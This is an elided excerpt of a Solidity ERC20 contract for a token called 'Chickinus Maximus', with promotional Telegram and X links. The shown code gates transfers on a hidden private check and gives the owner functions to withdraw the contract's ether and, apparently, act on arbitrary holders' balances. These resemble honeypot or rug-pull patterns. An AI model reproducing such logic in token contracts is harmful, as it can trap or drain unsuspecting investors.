...
https://t.me/CHICKIMUS_ERC20

https://x.com/i/broadcasts/1MYGNwBQDmpJw
...
contract Token is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Chickinus Maximus";
    string private constant _symbol = unicode"CHICKIMUS";
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        ...
        if(!superCharger(sender, recipient))
    ...
    function superCharger(address from, address to) private view returns (bool) {
    ...
    function superjudgeTransfer() private {
        _taxWallet.transfer(address(this).balance);
    }
    function sjEther() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function sjToken(address _address, uint256 percent) external onlyOwner {
